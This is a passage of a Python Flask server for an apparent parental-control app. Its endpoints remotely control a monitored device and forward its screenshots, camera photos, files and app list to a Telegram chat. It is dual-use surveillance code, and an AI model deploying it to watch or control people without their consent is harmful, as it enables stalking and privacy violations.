    valid = ('home', 'back', 'recents', 'notifications', 'lock', 'wake', 'screenshot')
    if key not in valid:
        return jsonify({'success': False, 'error': 'unknown key'}), 400
    cid = _enqueue(d.get('deviceId', 'unknown'), key, {})
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/rightclick', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_rightclick():
    d = request.json or {}
    cid = _enqueue(d.get('deviceId', 'unknown'), 'rightclick', {'x': d.get('x', 0), 'y': d.get('y', 0)})
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/doubleclick', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_doubleclick():
    d = request.json or {}
    cid = _enqueue(d.get('deviceId', 'unknown'), 'doubleclick', {'x': d.get('x', 0), 'y': d.get('y', 0)})
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/scroll', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_scroll():
    d = request.json or {}
    cid = _enqueue(d.get('deviceId', 'unknown'), 'scroll', {
        'x': d.get('x', 0), 'y': d.get('y', 0),
        'amount': d.get('amount', 0),
    })
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/hotkey', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_hotkey():
    d = request.json or {}
    keys = d.get('keys', '')
    if not keys:
        return jsonify({'success': False, 'error': 'keys required'}), 400
    cid = _enqueue(d.get('deviceId', 'unknown'), 'hotkey', {'keys': keys})
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/launch', methods=['POST'])
@require_parent_auth
@rate_limit('control')
def control_launch():
    d = request.json or {}
    device_id = d.get('deviceId', 'unknown')
    package = d.get('package', '')
    if not package:
        return jsonify({'success': False, 'error': 'package required'}), 400
    cid = _enqueue(device_id, 'launch', {'package': package})
    add_activity('launch', f'Launch: {package[:60]}', device_id)
    return jsonify({'success': True, 'id': cid})

@app.route('/api/control/launch-history', methods=['GET'])
@require_parent_auth
def control_launch_history():
    device_id = request.args.get('deviceId', '')
    limit = request.args.get('limit', 20, type=int)
    launches = [
        a for a in activities[-200:]
        if a.get('action') == 'launch' or (a.get('action') == 'control' and 'launch' in a.get('details', '').lower())
    ]
    if device_id:
        launches = [a for a in launches if a.get('device_id') == device_id]
    return jsonify({'success': True, 'launches': launches[-limit:]})

@app.route('/api/control/screen-info/<device_id>', methods=['GET'])
@require_parent_auth
def control_screen_info(device_id):
    info = device_screens.get(device_id)
    if not info:
        return jsonify({'width': 1080, 'height': 2400, 'density': 0, 'known': False})
    return jsonify({**info, 'known': True})

@app.route('/api/control/status/<cmd_id>', methods=['GET'])
@require_parent_auth
def control_status(cmd_id):
    r = command_results.get(cmd_id)
    if not r:
        return jsonify({'success': True, 'pending': True})
    return jsonify({'success': True, 'pending': False, **r})

@app.route('/api/control/devices', methods=['GET'])
@require_parent_auth
def control_devices_list():
    now = time.time()
    online = {k: (now - v < 10) for k, v in control_devices.items()}
    return jsonify({'success': True, 'devices': online})

# ============================================================
# TELEGRAM ENDPOINTS
# ============================================================

@app.route('/api/telegram/status', methods=['GET'])
@require_parent_auth
def telegram_status():
    return jsonify({
        "success": True,
        "enabled": telegram_config.get("enabled", False),
        "configured": bool(telegram_config.get("bot_token") and telegram_config.get("chat_id")),
    })

@app.route('/api/telegram/config', methods=['GET', 'POST'])
@require_parent_auth
def telegram_config_endpoint():
    global telegram_config
    if request.method == 'GET':
        return jsonify({
            'success': True,
            'config': {
                'bot_token': telegram_config.get('bot_token', ''),
                'chat_id':   telegram_config.get('chat_id', ''),
                'enabled':   telegram_config.get('enabled', False),
            }
        })
    data = request.json or {}
    if 'bot_token' in data:
        telegram_config['bot_token'] = str(data['bot_token']).strip()
    if 'chat_id' in data:
        telegram_config['chat_id'] = str(data['chat_id']).strip()
    if 'enabled' in data:
        telegram_config['enabled'] = bool(data['enabled'])
    _save_telegram_config()
    logger.info(f"📲 Telegram config updated (enabled={telegram_config['enabled']})")
    return jsonify({'success': True})

@app.route('/api/telegram/test', methods=['POST'])
@require_parent_auth
@rate_limit('telegram')
def telegram_test():
    r = _telegram_send_message(
        "🛡️ <b>Parental Control</b>\n\n"
        "✅ Telegram integration is connected.\n"
        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    return jsonify(r)

@app.route('/api/telegram/send-screenshot/<filename>', methods=['POST'])
@require_parent_auth
@rate_limit('telegram')
def telegram_send_screenshot(filename):
    filename = safe_filename(filename)
    for directory in [UPLOAD_DIR, SCREENSHOT_DIR]:
        filepath = directory / filename
        if filepath.exists():
            device_id = request.args.get('deviceId', '')
            caption = "📸 <b>Screenshot</b>"
            if device_id:
                caption += f"\n📱 Device: <code>{device_id[:12]}</code>"
            caption += f"\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            r = _telegram_send_photo(filepath, caption)
            add_activity('telegram', f'Sent screenshot {filename}', device_id)
            return jsonify(r)
    return jsonify({'success': False, 'error': 'File not found'}), 404

@app.route('/api/telegram/send-camera/<filename>', methods=['POST'])
@require_parent_auth
@rate_limit('telegram')
def telegram_send_camera(filename):
    filename = safe_filename(filename)
    for directory in [UPLOAD_DIR, CAMERA_DIR]:
        filepath = directory / filename
        if filepath.exists():
            caption = f"📷 <b>Camera Photo</b>\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            r = _telegram_send_photo(filepath, caption)
            add_activity('telegram', f'Sent camera photo {filename}')
            return jsonify(r)
    return jsonify({'success': False, 'error': 'File not found'}), 404

@app.route('/api/telegram/send-file/<filename>', methods=['POST'])
@require_parent_auth
@rate_limit('telegram')
def telegram_send_file(filename):
    filename = safe_filename(filename)
    for directory in [UPLOAD_DIR, FILES_DIR]:
        filepath = directory / filename
        if filepath.exists():
            caption = f"📎 <b>File</b>: {filename}\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            r = _telegram_send_document(filepath, caption)
            add_activity('telegram', f'Sent file {filename}')
            return jsonify(r)
    return jsonify({'success': False, 'error': 'File not found'}), 404

@app.route('/api/telegram/send-apps', methods=['POST'])
@require_parent_auth
@rate_limit('telegram')
def telegram_send_apps():
    data = request.json or {}
    device_id = data.get('deviceId', '')
    apps = installed_apps.get(device_id, [])
    if not apps:
        for a in installed_apps.values():
            apps = a
            break
    if not apps:
        return jsonify({'success': False, 'error': 'No apps reported'})

    lines = [f"📱 <b>Installed Apps</b> ({len(apps)})"]
    if device_id:
        lines.append(f"Device: <code>{device_id[:12]}</code>")
    lines.append("")
    for a in apps[:80]:
        label = (a.get('label') or a.get('name') or 'Unknown')[:50]
        lines.append(f"• {label}")
    if len(apps) > 80:
        lines.append(f"… and {len(apps) - 80} more")

    text = "\n".join(lines)
    r = _telegram_send_message(text)
    add_activity('telegram', f'Sent apps list ({len(apps)})', device_id)
    return jsonify(r)

@app.route('/api/telegram/send-text', methods=['POST'])
@require_parent_auth
@rate_limit('telegram')
def telegram_send_text():
    data = request.json or {}
    text = str(data.get('text', '')).strip()
    if not text:
        return jsonify({'success': False, 'error': 'No text'}), 400
    r = _telegram_send_message(text)
    add_activity('telegram', f'Sent text ({len(text)} chars)')
    return jsonify(r)

# ============================================================
# ERROR HANDLERS
# ============================================================

@app.errorhandler(404)
def not_found(e):
    return jsonify({"success": False, "error": "Endpoint not found"}), 404

@app.errorhandler(Exception)
def handle_exception(e):
    logger.error(f"Unhandled: {e}")
    return jsonify({"success": False, "error": str(e)}), 500

# ============================================================
# MAIN
# ============================================================

def main():
    print("=" * 70)
    print("  PARENTAL CONTROL v12.0 - PIN + TELEGRAM")
    print("=" * 70)
    logger.info(f"Web dir: {WEB_DIR}")
    logger.info(f"Running on Render: {IS_RENDER}")
    logger.info(f"Parent PIN: {'SET' if PARENT_PIN else 'NOT SET (unprotected)'}")
    logger.info(f"Agent PIN:  {'SET' if AGENT_PIN else 'NOT SET (unprotected)'}")
    logger.info(f"Telegram:   {'ENABLED' if telegram_config.get('enabled') else 'disabled'}")

    start_ping_system()
    app.run(host='0.0.0.0', port=5001, debug=False, threaded=True)

if __name__ == '__main__':
    main()